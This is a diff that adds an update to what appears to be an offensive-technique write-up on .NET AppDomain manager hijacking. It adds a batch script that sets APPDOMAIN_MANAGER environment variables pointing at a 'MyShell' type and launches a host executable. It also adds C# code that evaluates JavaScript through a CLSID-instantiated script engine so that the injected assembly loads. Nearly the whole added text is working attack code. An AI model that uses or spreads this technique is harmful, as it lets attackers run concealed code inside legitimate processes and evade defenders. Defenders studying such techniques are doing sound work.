@@ -119,3 +119,37 @@ public class MyProgram
 }
 ```
 
+UPDATE 16/3
+
+I did a mistake, when setting enviroment variables within code, a new process must be started to reflect the new settings, there are two options, run from .bat script or from within sysobj.exe set enviroment variable, drop new file and execute it.
+
+trigger.bat:
+
+```
+set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+set APPDOMAIN_MANAGER_TYPE=MyShell
+set COMPLUS_Version=v4.0.30319
+sysobj.exe
+```
+
+the sysobj.cs should look like this:
+
+sysobj.cs:
+
+```
+using System;
+
+public class MyProgram
+{
+    public static void Main(string[] args)
+    {
+        Type scriptType = Type.GetTypeFromCLSID(Guid.Parse("31D2B969-7608-426E-9D8E-A09FC9A5ACDC"));
+        dynamic obj = Activator.CreateInstance(scriptType, false);
+        obj.Language = "javascript";
+        string script = @"Trigger=new ActiveXObject('System.Object');";
+        obj.Eval(script);
+    }
+
+}
+
+```
